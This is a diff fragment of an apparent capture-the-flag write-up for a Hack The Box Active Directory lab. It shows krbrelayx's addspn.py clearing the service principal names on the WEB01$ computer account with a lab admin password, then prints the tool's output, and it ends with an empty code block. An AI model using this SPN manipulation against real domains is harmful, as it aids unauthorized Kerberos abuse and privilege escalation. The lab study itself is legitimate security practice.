@@ -665,5 +665,35 @@ This means i can essentially move the SPN from one machine to the other, i want 
 
 https://github.com/dirkjanm/krbrelayx
 
+```python
+python3 addspn.py --clear -t 'web01$' -u 'pirate.htb\a.white_adm' -p 'Password123!' '10.129.244.95'
+[-] Connecting to host...
+[-] Binding to host
+[+] Bind OK
+[+] Found modification target
+[+] Printing object before clearing
+DN: CN=WEB01,CN=Computers,DC=pirate,DC=htb - STATUS: Read - READ TIME: 2026-09-24T20:27:12.221378
+    dNSHostName: WEB01.pirate.htb
+    sAMAccountName: WEB01$
+    servicePrincipalName: tapinego/WEB01
+                          tapinego/WEB01.pirate.htb
+                          WSMAN/WEB01
+                          WSMAN/WEB01.pirate.htb
+                          HOST/WEB01.pirate.htb
+                          RestrictedKrbHost/WEB01.pirate.htb
+                          HOST/WEB01
+                          RestrictedKrbHost/WEB01
+                          TERMSRV/WEB01.pirate.htb
+                          TERMSRV/WEB01
+                          HTTP/WEB01
+                          HTTP/WEB01.pirate.htb
 
+[+] SPN Modified successfully
+```
+
+Ill first clear the SPNs
+
+```python
+
+```
 
